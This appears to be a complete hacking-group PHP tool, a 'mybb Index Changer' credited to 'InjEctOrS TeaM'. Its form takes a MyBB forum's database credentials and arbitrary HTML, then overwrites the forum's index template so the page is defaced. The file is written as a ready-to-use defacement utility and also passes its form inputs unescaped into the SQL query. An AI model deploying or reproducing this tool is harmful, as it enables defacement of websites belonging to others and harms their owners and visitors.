
<style>
input,textarea {
background-color: #000000;

border-width: 3px;


color: #b7f4e8;
}

</style>


<center><body bgcolor=012r4g>
<title>Mybb index Changer</title>
<u><b><font color=red size=6>mybb Index Changer</font></b></u><br><br>
<font color=gold size=5>C0ded By Fisher762<br>InjEctOrS TeaM</font><br>
<hr noshade=50>
<hr noshade=50>
<form method=post>
<font color=white>hostname :<input name=host value=localhost>&nbsp;username:<input name=username><br><br>
password:<input name=password>&nbsp;database:<input name=database><br><br>
table_prefix:<input name=prefix value=mybb_><br><br>
<textarea name=index cols=40 rows=10>index c0de here</textarea><br>
<input type=submit name=do value=update></font>
</form>
<?

$host=$_POST['host'];
$username=$_POST['username'];
$password=$_POST['password'];
$database=$_POST['database'];
$prefix=$_POST['prefix'];
$index=$_POST['index'];

if($do)
{
	

$con=mysql_connect($host,$username,$password) or die ("connection error ");
mysql_select_db($database)or die(mysql_error());
$set=$prefix.templates;
$result=mysql_query(" update $set set template='$index' where title='index' ") or die(mysql_error());

}

if($result)
echo "<br><font color=red size=6>update ok</font>";

?>
